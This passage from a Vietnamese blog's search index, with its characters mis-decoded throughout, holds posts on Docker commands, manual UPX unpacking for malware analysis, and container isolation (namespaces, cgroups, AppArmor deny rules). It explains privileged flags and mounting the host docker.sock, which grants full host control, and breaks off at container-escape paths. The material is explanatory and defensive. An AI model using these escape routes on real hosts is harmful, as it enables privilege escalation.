/\rtmpfs 64M 0 64M 0% /dev\rtmpfs 3.9G 0 3.9G 0% /sys/fs/cgroup\r/dev/sda2 110G 58G 46G 56% /etc/hosts\rshm 64M 0 64M 0% /dev/shm\rnone 3.9G 0 3.9G 0% /mnt\rroot@a3c5921afbbc:/#    flag --privileged s·∫Ω c·∫•p h·∫øt t·∫•t c·∫£ capabilities cho container, v√† lo·∫°i b·ªè m·ªçi gi·ªõi h·∫°n ƒë∆∞·ª£c ƒë·∫∑t ra b·ªüi cgroup controller. N√≥i c√°ch kh√°c, container c√≥ th·ªÉ ch·∫°y h·∫ßu h·∫øt m·ªçi th·ª© m√† m√°y host c√≥ th·ªÉ l√†m.  Set working directory (-w) 1  $ docker run -w /path/to/dir/ -i -t ubuntu pwd\r   -w cho ph√©p c√¢u l·ªánh th·ª±c thi b√™n trong th∆∞ m·ª•c ƒë√£ ch·ªâ ƒë·ªãnh. N·∫øu ƒë∆∞·ªùng d·∫´n t·ªõi th∆∞ m·ª•c kh√¥ng t·ªìn t·∫°i, n√≥ s·∫Ω t·∫°o m·ªôt th∆∞ m·ª•c m·ªõi trong container t∆∞∆°ng ·ª©ng ƒë∆∞·ªùng d·∫´n ƒë√≥.  Set storage driver options per container 1  $ docker run -it --storage-opt size=120G fedora /bin/bash\r    size cho ph√©p ch√∫ng ta thi·∫øt l·∫≠p container rootfs size t·ªõi 120G t·∫°i th·ªùi ƒëi·ªÉm t·∫°o. Option n√†y ch·ªâ hi·ªáu qu·∫£ cho devicemapper, btrfs, overlay2, windowsfilter v√† zfs graph drives\n  V·ªõi devicemapper, btrfs, windowsfilter and zfs graph drivers user kh√¥ng th·ªÉ g√°n k√≠ch th∆∞·ªõc nh·ªè h∆°n Default BasFS Size\n  V·ªõi overlay2 storage drive, size option ch·ªâ ho·∫°t ƒë·ªông n·∫øu tr√¨nh fs ƒë∆∞·ª£c g√°n l√† xfs v√† mounted v·ªõi option pquota. tr∆∞·ªùng h·ª£p n√†y, ng∆∞·ªùi d√πng c√≥ th·ªÉ c·∫•p size.\n  Mount tmpfs (\u0026ndash;tmpfs) 1  $ docker run -d --tmpfs /run:rw,noexec,nosuid,size=65536k my_image\r  flag --tmpfs mount m·ªôt empty tmpfs v√†o container v·ªõi rw, noexec, nosuid, size=65536k\nMount volume (-v, \u0026ndash;read-only) 1  $ docker run -v `pwd`:`pwd` -w `pwd` -i -t ubuntu pwd\r   -v mount th∆∞ m·ª•c hi·ªán t·∫°i v√†o container -w cho ph√©p command ƒë∆∞·ª£c th·ª±c thi b√™n trong th∆∞ m·ª•c hi·ªán t·∫°i b·∫±ng c√°ch thay ƒë·ªïi trong th∆∞ m·ª•c th√†nh gi√° tr·ªã ƒë∆∞·ª£c tr·∫£ v·ªÅ b·ªüi pwd. N√≥ s·∫Ω th·ª±c thi k·∫øt h·ª£p c√¢u l·ªánh s·ª≠ d·ª•ng container, nh∆∞ng b√™n trong th∆∞ m·ª•c hi·ªán t·∫°i:  1  $ docker run -v /doesnt/exist:/foo -w /foo -i -t ubuntu bash\r  Khi host directory c·ªßa bind-mounted volume kh√¥ng t·ªìn t·∫°i, Docker s·∫Ω t·ª± ƒë·ªông t·∫°o th∆∞ m·ª•c n√†y tr√™n host cho b·∫°n. Trong v√≠ d·ª• tr√™n, Docker s·∫Ω t·∫°o th∆∞ m·ª•c /doesnt/exist tr∆∞·ªõc khi ch·∫°y container.\n1  $ docker run --read-only -v /icanwrite busybox touch /icanwrite/here\r   --read-only ƒë·ªÉ ki·ªÉm so√°t n∆°i container vi·∫øt file, --read-only flag mount container\u0026rsquo;s root filesystem ch·ªâ ƒë·ªÉ ƒë·ªçc.  1  $ docker run -t -i -v /var/run/docker.sock:/var/run/docker.sock -v /path/to/static-docker-binary:/usr/bin/docker busybox sh\r  B·∫±ng c√°ch li√™n k·∫øt docker unix socket v·ªõi docker binary li√™n k·∫øt tƒ©nh, ch√∫ng ta c·∫•p container to√†n quy·ªÅn truy c·∫≠p v√† ch·ªânh s·ª≠a host\u0026rsquo;s Docker daemon.\nAdd bind mounts or volumes using the \u0026ndash;mount flag  V√≠ d·ª•:  1  $ docker run --read-only --mount type=volume,target=/icanwrite busybox touch /icanwrite/here\r  1  $ docker run -t -i --mount type=bind,src=/data,dst=/data busybox sh\r  Publish or expose port (-p, \u0026ndash;expose) 1  $ docker run -p 127.0.0.1:80:8080/tcp ubuntu bash\r    C√¢u l·ªánh k·∫øt n·ªëi c·ªïng 8080 c·ªßa container t·ªõi c·ªìng 80 TCP tr√™n 127.0.0.1 c·ªßa host machine. Ch√∫ng ta c√≥ th·ªÉ ch·ªâ ƒë·ªãnh udp v√† sctp ports.\n  C√≥ m·ªôt l∆∞u √Ω, nh·ªØng port kh√¥ng r√†ng bu·ªôc b·ªüi host s·∫Ω c√≥ th·ªÉ ƒë∆∞·ª£c truy c·∫≠p t·ª´ b√™n ngo√†i. ƒêi·ªÅu n√†y c≈©ng √°p d·ª•ng n·∫øu ch√∫ng ta mu·ªën c·∫•u h√¨nh UFW ƒë·ªÉ ch·∫∑n c√¥ng c·ª• n√†y, v√¨ Docker qu·∫£n l√Ω c√°c quy t√°c iptables c·ªßa ri√™ng m√¨nh.\n  1  $ docker run --expose 80 ubuntu bash\r  Hi·ªÉn th·ªã c·ªïng 80 c·ªßa container m√† kh√¥ng c√≥ xu·∫•t hi·ªán port tr√™n host system.\nSet environment variables (-e, \u0026ndash;env, \u0026ndash;env-file) 1  docker run -e MYVAR1 --env MYVAR2=foo --env-file ./env.list ubuntu bash\r   S·ª≠ d·ª•ng nh·ªØng flag -e, --env, --env-file ƒë·ªÉ thi·∫øt l·∫≠p nh·ªØng bi·∫øn m√¥i tr∆∞·ªùng (kh√¥ng ph·∫£i d·∫°ng array) cho container b·∫°n ƒëang ch·∫°y, ho·∫∑c ghi ƒë√® nh·ªØng file ƒë√≥ c√≥ s·∫µn.  v√≠ d·ª•:\n1 2 3  ‚ùØ docker run --env VAR1=value1 --env VAR2=value2 ubuntu env | grep VAR\rVAR2=value2\rVAR1=value1\r  Connect a container to a network (\u0026ndash;network) 1  $ docker run -itd --network=my-net busybox\r  Ch√∫ng ta c√≥ th·ªÉ ch·ªçn ƒë·ªãa ch·ªâ IP cho container v·ªõi flag --ip ho·∫∑c --ip6 khi b·∫°n ch·∫°y container tr√™n user-defined network\n1  $ docker run -itd --network=my-net --ip=10.10.9.75 busybox\r  Docker rm ƒê·ªÉ x√≥a container khi n√≥ ƒëang d·ª´ng, ta d√πng l·ªánh docker rm container_id\n1 2 3 4 5 6 7 8 9 10 11  ‚ùØ docker ps -a\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 9 minutes ago Exited (0) 7 minutes ago centos_docker\rff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) 45 minutes ago unruffled_goldberg\rb2d8e983bcef ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) About an hour ago gallant_snyder\r‚ùØ docker rm b2\rb2\r‚ùØ docker ps -a\rCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES\rddf68933af54 centos:latest \u0026#34;/bin/bash\u0026#34; 10 minutes ago Exited (0) 7 minutes ago centos_docker\rff7140c65b73 ubuntu:latest \u0026#34;/bin/bash\u0026#34; About an hour ago Exited (0) 45 minutes ago unruffled_goldberg\r  Tr∆∞·ªùng h·ª£p container ƒëang ch·∫°y m√† ta mu·ªën x√≥a th√¨ ta th√™m options -f\n1  docker rm -f container_id/container_name\r  T·ªïng k·∫øt Trong b√†i h·ªçc n√†y, ch√∫ng ta ƒë√£ h·ªçc ƒë∆∞·ª£c t·ª´ anh XuanThuLabChanel nh·ªØng ki·∫øn th·ª©c nh∆∞ sau:\n docker images:  Li·ªát k√™ danh s√°ch t·∫•t c·∫£ c√°c images tr√™n docker docker pull image:tag t·∫£i image v·ªÅ m√°y docker image rm image_name/image_id x√≥a image docker version: xem version c·ªßa docker docker run -it --name \u0026quot;ten_container\u0026quot; -h \u0026quot;host_name\u0026quot; image: t·∫°o container. ctrl + P, ctrl + Q: tho√°t kh·ªèi container nh∆∞ng v·∫´n ƒë·ªÉ container ch·∫°y. docker ps: in ra container ch·∫°y docker stop container_id/name: bu·ªôc container ƒëang ch·∫°y d·ª´ng khi ta ƒëang ·ªü host. docker attach container_id/name: tr·ªü l·∫°i container ƒëang ch·∫°y. docker rm containerid/name: x√≥a container ƒë√£ d·ª´ng. docker rm -f containerid/name: x√≥a container ƒëang ch·∫°y.\nK·∫øt th√∫c b√†i vi·∫øt n√†y, m·ªôt l·∫ßn n·ªØa em xin ch√¢n th√†nh g·ª≠i l·ªùi c·∫£m ∆°n ƒë·∫øn anh XuanThuLabChanel ƒë√£ l√†m nh·ªØng b√†i h·ªçc qu√Ω gi√° v√† b·ªï √≠ch n√†y.  ","description":"B√†i n√†y ch√∫ng ta s·∫Ω h·ªçc l√†m quen v·ªõi docker command line, m·ªôt s·ªë c√¢u l·ªánh th√¥ng d·ª•ng nh∆∞ docker images, docker version, docker run, docker rm","id":16,"section":"posts","tags":["Docker"],"title":"T√¨m hi·ªÉu v√† s·ª≠ d·ª•ng docker (P1)","uri":"https://minhlongmt183.github.io/posts/docker_p1/"},{"content":"Ngu·ªìn tham kh·∫£o\nWhat is Packing? Packing c√≥ nghƒ©a l√† n√©n (compressed), ho·∫∑c x√°o tr·ªôn (obfuscated) file th·ª±c thi ƒë·ªÉ l√†m cho file th·ª±c thi kh√≥ ph√°t hi·ªán, kh√≥ ph√¢n t√≠ch tƒ©nh, kh√≥ d·ªãch ng∆∞·ª£c. Trong ng·ªØ c·∫£nh c·ªßa malware, v√¨ m√£ ƒë·ªôc ch·ªß y·∫øu ƒë∆∞·ª£c compressed, obfuscated trong c√°c m·∫´u ƒë√≥ng g√≥i, c√°c c√¥ng c·ª• d√πng ƒë·ªÉ ph√¢n t√≠ch tƒ©nh s·∫Ω g·∫∑p v·∫•n ƒë·ªÅ khi x√°c ƒë·ªãnh li·ªáu t·ªáp nh·ªã ph√¢n n√†y c√≥ ph·∫£i l√† m√£ ƒë·ªôc hay kh√¥ng. B√™n c·∫°nh n√≥, m·ªôt thu·∫≠t to√°n packing t·ªët s·∫Ω l√†m kh√≥ khƒÉn q√∫a tr√¨nh ph√¢n t√≠ch c·ªßa c√°c nh√† ph√¢n t√≠ch m√£ ƒë·ªôc, t·ª´ ƒë√≥ gi√∫p cho v√≤ng ƒë·ªùi c·ªßa m√£ ƒë·ªôc ƒë∆∞·ª£c k√©o d√†i l√¢u h∆°n.\nM·ªôt c√°ch n√¥m na, ch√∫ng ta c√≥ th·ªÉ hi·ªÉu packer g·ªìm: compressing packers v√† encrypting packers. Trong ƒë√≥ compressing packers m·ª•c ƒë√≠ch l√† ƒë∆∞a file th·ª±c thi v·ªÅ d·∫°ng n√©n, l√†m gi·∫£m k√≠ch th∆∞·ªõc c·ªßa file, c√≤n encrypting packers c√≥ m·ª•c ƒë√≠ch m√£ h√≥a ho·∫∑c x√°o tr·ªôn file ƒë√£ ƒë∆∞·ª£c n√©n, nh·∫±m ngƒÉn ch·∫∑n ng∆∞·ªùi d√πng d·ªãch ng∆∞·ª£c. Nh∆∞ ƒë√£ n√≥i, c√°ch hi·ªÉu tr√™n ch·ªâ l√† hi·ªÉu m·ªôt c√°ch n√¥m na, b·ªüi v√¨ c√≥ nhi·ªÅu packer k·∫øt h·ª£p c·∫£ hai t√≠nh ch·∫•t tr√™n, c√≤n c√≥ nh∆∞ng packer (nh∆∞ UPX), n√≥ ch·ªâ compressing m√† kh√¥ng c√≥ encrypting.\nHow does packing work? Ch√∫ng ta s·∫Ω n√≥i v·ªÅ ki·∫øn tr√∫c \u0026ldquo;stub-payload\u0026rdquo;, m·ªôt trong nh·ªØng c∆° ch·∫ø ƒë∆∞·ª£c s·ª≠ d·ª•ng nhi·ªÅu b·ªüi packer, k·ªÉ c·∫£ UPX.\nTrong ki·∫øn tr√∫c \u0026ldquo;stub-payload\u0026rdquo;, m·ªôt file th·ª±c thi s·∫Ω g·ªìn hai th√†nh ph·∫ßn ch√≠nh: n·ªôi dung ƒë√£ ƒë∆∞·ª£c n√©n / m√£ h√≥a t·ª´ file g·ªëc v√† m·ªôt ƒëo·∫°n m√£ d√πng ƒë·ªÉ gi·∫£i n√©n / gi·∫£i m√£ file n√†y v·ªÅ file g·ªëc v√† th·ª±c thi n√≥. ƒêo·∫°n m√£ n√†y ƒë∆∞·ª£c g·ªçi l√† stub. V·ªÅ b·∫£n ch·∫•t, file ban ƒë·∫ßu ƒë∆∞·ª£c n·∫øn / m√£ h√≥a, sau ƒë√≥ ƒë∆∞·ª£c b·ªçc trong t·ªáp th·ª±c thi m·ªõi c√≥ ch·ª©a m√£ ƒë·ªÉ ƒë∆∞a n√≥ v·ªÅ tr·∫°ng th√°i ban ƒë·∫ßu\nIndication of Packing Lacking of Import in Import Address Table (IAT) ƒê·ªÉ m·ªôt file th·ª±c thi c√≥ th·ªÉ t∆∞∆°ng t√°c v·ªõi h·ªá ƒëi·ªÅu h√†nh th√¨ file th·ª±c thi c·∫ßn ph·∫£i c√≥ c√°c h√†m ƒë∆∞·ª£c t√≠ch h·ª£p v√†o th∆∞ vi·ªán h·ªá th·ªëng nh∆∞ kernel32.dll v√† user32.dll. Khi ph√¢n t√≠ch m·ªôt t·ªáp tin ƒë√£ ƒë∆∞·ª£c gi·∫£i n√©n ho√†n to√†n, ta s·∫Ω th·∫•y m·ªôt s·ªë l∆∞·ª£ng l·ªõn c√°c import v√¨ m√£ ƒë·ªôc r√µ r√†ng mu·ªën t∆∞∆°ng t√°c kh√° nhi·ªÅu v·ªõi h·ªá ƒëi·ªÅu h√†nh. Tuy nhi√™n, m·ªôt stub c·ªßa m·ªôt ch∆∞∆°ng tr√¨nh b·ªã packed kh√¥ng c√≥ nhi·ªÅu ch·ª©c nƒÉng ngo√†i vi·ªác gi·∫£i n√©n v√† th·ª±c thi file g·ªëc, do ƒë√≥, n√≥ s·∫Ω c√≥ s·ªë l∆∞·ª£ng import √≠t h∆°n r·∫•t nhi·ªÅu so v·ªõi file chu·∫©n.\nNon-standard Section Names: Trong nh·ªØng file th·ª±c thi b√¨nh th∆∞·ªùng, ch√∫ng th∆∞·ªùng c√≥ c√°c sections gi·ªëng nhau m·ªçi l√∫c (.text, .data, .rsrc,..). Tuy nhi√™n, nh·ªØng paker s·∫Ω t·ª± ƒë·ªãnh nghƒ©a section cho ri√™ng n√≥, ƒëi·ªÅu n√†y c≈©ng cho th·∫•y nh·ªØng file c√≥ section nh∆∞ v·∫≠y s·∫Ω kh√¥ng ph·∫£i l√† ti√™u chu·∫©n v√† c√≥ th·ªÉ ƒë∆∞·ª£c ƒë√≥ng g√≥i. V√≠ d·ª• nh∆∞ UPX packer s·∫Ω th·ª±c thi v·ªõi c√°c file c√≥ t√™n section l√† UPX0 v√† UPX1.\nSections with a small raw size but a large virtual size Khi ch√∫ng ta g·∫∑p m·ªôt file m√† c√≥ raw size r·∫•t nh·ªè (ƒë√¥i khi b·∫±ng 0), ƒëi·ªÅu n√†y mu·ªën n√≥i file th·ª±c thi kh√¥ng c√≥ b·∫•t k√¨ d·ªØ li·ªáu n√†o trong section. Tuy nhi√™n, khi file th·ª±c thi ƒë∆∞·ª£c load v√†o b·ªô nh·ªõ, raw size kh√¥ng c√≤n li√™n quan, v√† n√≥ ƒë∆∞·ª£c thay b·ªüi virtual size c·ªßa t·ª´ng ph·∫ßn c·ª• th·ªÉ ƒë∆∞·ª£c c·∫•p ph√°t trong memory. N·∫øu m·ªôt file c√≥ section ƒë∆∞·ª£c c·∫•p ph√°t v·ªõi virtual space l·ªõn v√† raw data r·∫•t nh·ªè, n√≥ c√≥ kh·∫£ nƒÉng cao l√† nh·ªØng ƒëo·∫°n code d√πng ƒë·ªÉ unpacked.\nSections with very high entropy: T·ª´ entroy ƒë·ªÅ c·∫≠p ƒë·∫øn ph∆∞∆°ng sai v√† t√≠nh ng·∫´u nhi√™n c·ªßa m·ªôt ph·∫ßn d·ªØ li·ªáu. Nh·ªØng th·ª© nh∆∞ ng√¥n ng·ªØ Ti·∫øng Anh, assembly code, c√°c c·∫•u tr√∫c giao ti·∫øp ƒë∆∞·ª£c x√°c ƒë·ªãnh r√µ r√†ng kh√°c th∆∞·ªùng c√≥ entropy th·∫•p v√¨ ng√¥n ng·ªØ c√≥ xu h∆∞·ªõng tu·∫ßn theo c√°c m·∫´u c√≥ th·ªÉ ƒëo√°n tr∆∞·ªõc ƒë∆∞·ª£c. Tuy nhi√™n, encrypted data v√† compressed data kh√¥ng c√≥ kh·∫£ nƒÉng d·ª± ƒëo√°n tr∆∞·ªõc, do ƒë√≥ c√≥ entropy cao h∆°n nhi·ªÅu. Do ƒë√≥, khi ki·ªÉm tra n·∫øu th·∫•y c√≥ entropy cao th√¨ kh·∫£ nƒÉng d·ªØ li·ªáu n√†y ƒë√£ ƒë∆∞·ª£c n√©n ho·∫∑c m√£ h√≥a.\nLow number of discernible strings: Trong file kh√¥ng b·ªã n√©n, ch√∫ng ta s·∫Ω nh·∫≠n th·∫•y c√≥ m·ªôt l∆∞·ª£ng nh·∫•t ƒë·ªãnh c√°c chu·ªói c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c v√¨ h·∫ßu h·∫øt c√°c ·ª©ng d·ª•ng (k·ªÉ c·∫£ malware) s·ª≠ d·ª•ng nh·ªØng protocol ƒë∆∞·ª£c hi·ªán th·ª±c b·ªüi ng√¥n ng·ªØ con ng∆∞·ªùi. Do ƒë√≥, trong m·ªôt file b√¨nh th∆∞·ªùng, nh·ªØng chu·ªói n√†y n√™n xu·∫•t hi·ªán, v√† khi th·∫•y nh·ªØng chu·ªói c√≥ th·ªÉ ƒë·ªçc ƒë∆∞·ª£c ·ªü m·ªôt file qu√° √≠t ho·∫∑c kh√¥ng c√≥, kh·∫£ nƒÉng cao file n√†y ƒë√£ b·ªã n√©n ho·∫∑c b·ªã m√£ h√≥a.\nSections with RWX privileges: Trong c√°c file b√¨nh th∆∞·ªùng, m·ªôt section s·∫Ω r·∫•t √≠t khi ƒë∆∞·ª£c cho ph√©p c·∫£ ƒë·ªçc v√† ghi, v√¨ ch√∫ng ta hi·∫øm khi mu·ªën vi·∫øt ƒë√® file th·ª±c thi trong ·ª©ng d·ª•ng c·ªßa m√¨nh. Ngo√†i ra, hi·∫øm khi vi·∫øt tr·ª±c ti·∫øp v√†o file th·ª±c thi trong l√∫c n√≥ ƒëang ch·∫°y. Do ƒë√≥, kh√¥ng c√≥ l√Ω do n√†o ƒë·ªÉ section ƒë∆∞·ª£c c·∫•p quy·ªÅn v·ª´a ghi v√† v·ª´a ƒë·ªçc ngo·∫°i tr·ª´ packer. V·ªõi packer, d·ªØ li·ªáu sau khi gi·∫£i n√©n s·∫Ω ƒë∆∞·ª£c ghi v√†o section r·ªìi th·ª±c thi.\njmp or call Instructions to registers/strange memory addresses: Tr√™n nhi·ªÅu packers, ƒë·ªãa ch·ªâ t·ªõi n∆°i d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c gi·∫£i n√©n th∆∞·ªùng ƒë∆∞·ª£c l∆∞u tr√™n c√°c thanh ghi v√† ƒë·ªãa ch·ªâ ƒë√≥ th∆∞·ªùng n·∫±m trong m·ªôt section kh√°c, do d√≥ ch√∫ng ta s·∫Ω th·∫•y b∆∞·ªõc n√†y nh·∫£y r·∫•t xa. C√°c b∆∞·ªõc nh·∫£y xa nh∆∞ th·∫ø th∆∞·ªùng kh√¥ng ph·ªï bi·∫øn, v√¨ t·∫•t c·∫£ c√°c m√£ th·ª±c thi trong h·ªá nh·ªã ph√¢n th∆∞·ªùng ƒë∆∞·ª£c ch·ª©a trong m·ªôt section duy nh·∫•t. N·∫øu ch√∫ng ta th·∫•y m·ªôt l·ªánh jump / call ƒë·∫øn m·ªôt ƒë·ªãa ch·ªâ m√†:\n1. Kh√¥ng c√≥ trong section hi·ªán t·∫°i\n2. Kh√¥ng c√≥ trong kh√¥ng gian ƒë·ªãa ch·ªâ c·ªßa m·ªôt th∆∞ vi·ªán ƒë√£ t·∫£i.\nth√¨ kh·∫£ nƒÉng cao b∆∞·ªõc nh·∫£y n√†y l√† b∆∞·ªõc gi·∫£i n√©n.\nNh·∫≠n di·ªán v·ªõi file ƒë∆∞·ª£c m√£ h√≥a b·∫±ng UPX C√°c b∆∞·ªõc gi√∫p ch√∫ng ta nh·∫≠n di·ªán v√† gi·∫£i n√©n file b·ªã m√£ h√≥a b·∫±ng UPX:\n Ki·ªÉm tra PE header v√† x√°c ƒë·ªãnh xem ch√∫ng c√≥ th·ª±c s·ª± b·ªã ƒë√≥ng g√≥i kh√¥ng. Tuy nhi√™n b∆∞·ªõc x√°c ƒë·ªãnh n√†y ch√∫ng ta c√≥ th·ªÉ d√πng peid. T√¨m n∆°i gi·∫£i n√©n s·∫Ω ƒë∆∞·ª£c ghi. T√¨m ki·∫øm l·ªánh jmp ho·∫∑c call tham chi·∫øu ƒë·∫øn m·ªôt thanh ghi ho·∫∑c kh√¥ng gian b·ªô nh·ªõ n∆°i l∆∞u d·ªØ li·ªáu gi·∫£i n√©n c√≥ th·ªÉ ƒë∆∞·ª£c ghi v√†o trong m√£ g·ªëc. ƒê·∫∑t breakpoint ·ªü nh·ªØng l·ªánh n√†y. Dump data ch·ª©a trong kh√¥ng gian b·ªô nh·ªõ ƒë√≥, s·ª≠a import resolutions v√† xu·∫•t n√≥ d∆∞·ªõi d·∫°ng t·ªáp th·ª±c thi m·ªõi.  √Åp d·ª•ng. Ta √°p d·ª•ng v·ªõi b√†i garbage c·ªßa flareon-2020.\n","description":"Packer l√† m·ªôt ch∆∞∆°ng tr√¨nh d√πng ƒë·ªÉ n√©n v√† che d·∫•u file th·ª±c thi c·ªßa m√¨nh. N√≥ ƒë∆∞·ª£c s·ª≠ d·ª•ng nh·∫±m gi√∫p c√°c developer gi·∫•u ƒëi file th·ª±c thi c·ªßa m√¨nh, ƒë·ªÉ l√†m kh√≥ c√°c reverser khi·∫øn h·ªç kh√≥ khƒÉn trong qu√° tr√¨nh b·∫ª kh√≥a ch∆∞∆°ng tr√¨nh c·ªßa m√¨nh. Tuy nhi√™n ·ª©ng d·ª•ng c≈©ng nh∆∞ kƒ© thu·∫≠t n√†y c≈©ng ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ t·∫°o ra m√£ ƒë·ªôc, v√† n√≥ c≈©ng g√¢y ra nhi·ªÅu kh√≥ khƒÉn cho c√°c nh√† ph√¢n t√≠ch m√£ ƒë·ªôc trong qu√° tr√¨nh nghi√™n c·ª©u.","id":17,"section":"posts","tags":["Malware, flareon"],"title":"Manually Unpacking UPX Executables (v·∫´n ƒëang update...)","uri":"https://minhlongmt183.github.io/posts/packet/"},{"content":"Container Basics Ch√∫ng ta s·∫Ω ƒëi qua m·ªôt s·ªë kh√°i ni·ªám c∆° b·∫£n v√† c·∫ßn thi·∫øt trong docker:\nCredentials Credentials describe the user identity of a task, which determine its permission for shared resources such as files, semaphores, and shared memory.\nCapabilities Since kernel 2.2, Linux divides the privileges associated with superuser into distinct unit known as capabilities\n/proc/$PID/status | man capabilities\rFilesystem The container\u0026rsquo;s root mount is often planted in a container-specialized filesystem, such as OverlayFS\n/var/lib/docker/overlay2/..hash../diff\rNamespaces  M·ª•c ƒë√≠ch: l√†m cho h·ªá th·ªëng container c√≥ th·ªÉ s·ª≠ d·ª•ng v√† an to√†n. PID: have their own view of tasks - cung c·∫•p c√¢y kh√¥ng gian t√™n c·ªßa process id. N√≥ cho ph√©p m·ªói container c√≥ m·ªôt c√¢y ƒë·∫ßy ƒë·ªß c√°c process id ri√™ng bi·ªát, trong ƒë√≥ init process c√≥ pid = 1. Process ch·∫°y tr√™n host s·∫Ω c√≥ pid kh√°c v·ªõi khi ch·∫°y tr√™n container. User: wrap mapping of UID to user - cung c·∫•p phi√™n b·∫£n namespace c·ªßa User IDs (UIDs) and Group IDs (GIDs). ƒê√¢y l√† m·ªôt trong nh·ªØng t√≠nh nƒÉng quan tr·ªçng nh·∫•t c·ªßa h·ªá th·ªëng container hi·ªán ƒë·∫°i v√¨ n√≥ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ cung c·∫•p \u0026ldquo;unprivileged containers\u0026rdquo;. User namespaces cung c·∫•p m·ªôt trong nh·ªØng n·ªÅn t·∫£n cho h·ªá th·ªëng container tr√™n Linux hi·ªán nay, v√† l√† v√πng c·∫•u h√¨nh duy nh·∫•t ƒë∆∞·ª£c LXC coi l√† an to√†n. Mount: isolate mount points - cung c·∫•p ch·∫ø ƒë·ªô xem kh√¥ng gian t√™n c·ªßa c√°c ƒëi·ªÉm k·∫øt n·ªëi (mount points). K·∫øt h·ª£p v·ªõi pivot_root syscall, t√≠nh nƒÉng n√†y s·∫Ω c√¥ l·∫≠p container\u0026rsquo;s filesystem v·ªõi host\u0026rsquo;s filesystem. Network: cung c·∫•p kh√¥ng gian t√™n v√† ngƒÉn x·∫øp m·∫°ng ri√™ng bi·ªát. H·∫ßu h·∫øt c√°c tr∆∞·ªùng h·ª£p s·ª≠ d·ª•ng c·ªßa container li√™n quan t·ªõi d·ªãch v·ª• m·∫°ng, v√¨ v·∫≠y n√≥ ƒë∆∞·ª£c coi l√† t√≠nh nƒÉng l√µi c·ªßa container. UTS: have their own hostname - cung c·∫•p namespaced version c·ªßa ƒë·ªãnh danh h·ªá th·ªëng (system identifies) IPC: restrict SysV IPC objects Cgroup: isolate the view of cgroups  /proc/$PID/ns/\rCgroups CGroups: cung c·∫•p giao di·ªán ph√¢n c·∫•p ƒë·ªÉ qu·∫£n l√≠ c≈©ng nh∆∞ ƒëo l∆∞·ªùng t√†i nguy√™n v√† quy·ªÅn truy c·∫≠p c·ªßa thi·∫øt b·ªã. Cgroups c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng b·ªüi c√°c process c√≥ quy·ªÅn h·∫°n cao (higher privileged) ƒë·ªÉ ƒë·∫∑t gi·ªõi h·∫°n v·ªÅ s·ª≠ d·ª•ng b·ªô nh·ªõ, CPU, ch·∫∑n c√°c thi·∫øt b·ªã IO kh√°c. Ch√∫ng c√≤n c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng chung v·ªõi iptables ƒë·ªÉ cung c·∫•p ƒë·ªãnh h√¨nh l∆∞u l∆∞·ª£ng. Quan trong nh·∫•t, ch√∫ng ƒë∆∞·ª£c s·ª≠ d·ª•ng trong h·ªá th·ªëng container ƒë·∫ª ki·ªÉm so√°t quy·ªÅn truy c·∫≠p c·ªßa c√°c thi·∫øt b·ªã.\nLinux Security Modules - LSMs  AppArmor and SELinux are Linux security modules providing Mandatory Access Control (MAC), where access rules for a program are described by a profile. AppArmor l√† LSM ph·ªï bi·∫øn nh·∫•t trong h·ªá th·ªëng container, n√≥ c√≥ th·ªÉ gi·ªõi h·∫°n c√°c h√†nh ƒë·ªông m√† m·ªôt ch∆∞∆°ng tr√¨nh nh·∫•t ƒë·ªãnh c√≥ th·ªÉ th·ª±c hi·ªán, c≈©ng nh∆∞ th·ª±c hi·ªán c√°c h√†nh ƒë·ªông ph·ª©c t·∫°p khi b·∫Øt ƒë·∫ßu process. C·∫£ LXC v√† Docker ƒë·ªÅu thi·∫øt l·∫≠p ·ªü ch·∫ø ƒë·ªô m·∫∑c ƒë·ªãnh ƒë·ªÉ x√¢y d·ª±ng nh·ªØng r√†o c·∫£n an ninh, ch·ªëng l·∫°i nh·ªØng m·ªëi ƒëe d·ªça theo chi·ªÅu s√¢u. Cho ƒë·∫øn nay, AppArmor ƒë∆∞·ª£c ghi nh·∫≠n l√† h·ªó tr·ª£ v√† ghi nh·∫≠n t·ªët nh·∫•t. Do s·ª± ƒë∆°n gi·∫£n c·ªßa c√∫ ph√°p AppArmor, n√≥ c≈©ng d·ªÖ s·ª≠ d·ª•ng h∆°n r·∫•t nhi·ªÅu ƒë·ªÉ c·∫•u h√¨nh t√πy ch·ªânh cho m·ªói v√πng ch·ª©a. Docker and LXC enable a default LSM profile in enforcement mode, wh mostly serves to restrict a container\u0026rsquo;s access to sensitive /proc and /sys entries. The profile also denies mount syscall.  T·∫ßm quan tr·ªçng c·ªßa Apparmor Mount Options  Ch√≠nh s√°ch c·ªßa AppArmor ch·∫∑n vi·ªác truy c·∫≠p ƒë·ªÉ mounting devpts filesystems. Nh∆∞ comment ·ªü d∆∞·ªõi, n·∫øu kh√¥ng c√≥ ch√≠nh s√°ch n√†y, container c√≥ th·ªÉ remount /dev/pts v√† chi·∫øm quy·ªÅn truy c·∫≠p v√†o c√°c thi·∫øt b·ªã ƒë·∫ßu cu·ªëi c·ªßa m√°y ch·ªß.  1 2 3 4  # the container may never be allowed to mount devpts. If it does, it\r# will remount the host\u0026#39;s devpts. We could allow it to do it with\r# the newinstance option (but, right now, we don\u0026#39;t).\rdeny mount fstype=devpts\r   C√°c ch√≠nh s√°ch d√πng ƒë·ªÉ ch·∫∑n container c·ªë g·∫Øng remount root filesystem. Ch√≠nh s√°ch n√†y ƒë∆∞·ª£c th·ª±c hi·ªán nh∆∞ m·ªôt bi·ªán ph√°p ph√≤ng th·ªß theo chi·ªÅu s√¢u.  1 2 3  # ignore DENIED message on / remount\rdeny mount options=(ro, remount) -\u0026gt; /,\rdeny mount options=(ro, remount, silent) -\u0026gt; /,\r  Utility Changes   C√≥ r·∫•t nhi·ªÅu \u0026ldquo;n∆°i nguy hi·ªÉm\u0026rdquo; trong /proc v√† /sys cho ph√©p c√°c container tho√°t ra ngo√†i (container 